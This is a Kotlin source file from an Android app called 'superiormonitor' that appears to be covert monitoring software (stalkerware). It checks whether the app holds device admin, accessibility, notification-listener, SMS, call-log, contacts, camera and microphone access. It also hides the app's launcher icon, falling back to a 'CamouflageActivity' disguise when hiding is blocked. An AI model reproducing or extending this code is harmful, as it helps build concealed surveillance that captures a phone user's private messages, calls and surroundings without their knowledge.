package com.system.superiormonitor.core

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import androidx.core.app.NotificationManagerCompat
import androidx.core.content.ContextCompat
import com.system.superiormonitor.ui.PermissionStatus

/**
 * Encapsulates all interactions with the Android OS to retrieve permission states
 * and modify system-level configurations (like launcher icon visibility).
 */
object SystemManager {

    fun checkAllPermissions(context: Context, hasRoot: Boolean): PermissionStatus {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminName = ComponentName(context, MonitorDeviceAdminReceiver::class.java)
        val hasDeviceAdmin = dpm.isAdminActive(adminName)

        val enabledListeners = Settings.Secure.getString(context.contentResolver, "enabled_notification_listeners")
        val hasNotifListener = enabledListeners?.contains(context.packageName + "/" + MonitorNotificationListenerService::class.java.name) == true

        val hasPostNotifs = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ContextCompat.checkSelfPermission(context, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED
        } else {
            true
        }

        var accessibilityEnabled = 0
        try {
            accessibilityEnabled = Settings.Secure.getInt(context.contentResolver, Settings.Secure.ACCESSIBILITY_ENABLED)
        } catch (e: Settings.SettingNotFoundException) { }

        val hasAccessibility = if (accessibilityEnabled == 1) {
            val settingValue = Settings.Secure.getString(context.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
            settingValue?.contains(context.packageName + "/" + MonitorAccessibilityService::class.java.name) == true
        } else false

        val hasSystemAlertWindow = Settings.canDrawOverlays(context)
        val hasIgnoreBattery = (context.getSystemService(Context.POWER_SERVICE) as PowerManager).isIgnoringBatteryOptimizations(context.packageName)

        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val isInternetConnected = cm.activeNetwork != null

        val hasCallAccess = ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED &&
                        ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED

        val hasSmsAccess = ContextCompat.checkSelfPermission(context, Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED &&
                       ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED

        val hasContactsAccess = ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED

        val isCameraGranted = ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED &&
                          ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED &&
                          ContextCompat.checkSelfPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED

        val hasMicrophoneAccess = ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED

        val hasWriteSettings = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.System.canWrite(context) else true

        return PermissionStatus(
            hasRoot = hasRoot,
            hasDeviceAdmin = hasDeviceAdmin,
            hasNotifListener = hasNotifListener,
            hasPostNotifs = hasPostNotifs,
            hasAccessibility = hasAccessibility,
            hasSystemAlertWindow = hasSystemAlertWindow,
            hasIgnoreBattery = hasIgnoreBattery,
            hasCallAccess = hasCallAccess,
            hasSmsAccess = hasSmsAccess,
            hasContactsAccess = hasContactsAccess,
            hasCameraAccess = isCameraGranted,
            hasMicrophoneAccess = hasMicrophoneAccess,
            isInternetConnected = isInternetConnected,
            hasWriteSettings = hasWriteSettings
        )
    }

    fun isLauncherHidden(context: Context): Boolean {
        return try {
            context.packageManager.getComponentEnabledSetting(
                ComponentName(context, "com.system.superiormonitor.MainActivityLauncher")
            ) == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
        } catch (e: Exception) {
            false
        }
    }

    fun setLauncherHidden(context: Context, hide: Boolean): Boolean {
        val compMain = ComponentName(context, "com.system.superiormonitor.MainActivityLauncher")
        val compCamo = ComponentName(context, "com.system.superiormonitor.core.CamouflageActivity")
        return try {
            if (hide) {
                context.packageManager.setComponentEnabledSetting(compCamo, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
                context.packageManager.setComponentEnabledSetting(compMain, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
            } else {
                context.packageManager.setComponentEnabledSetting(compMain, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
                context.packageManager.setComponentEnabledSetting(compCamo, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
            }
            true
        } catch (e: Exception) {
            if (hide) {
                // Fallback for Device Admin restriction
                try {
                    context.packageManager.setComponentEnabledSetting(compCamo, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
                    true
                } catch (ex: Exception) { false }
            } else false
        }
    }
}
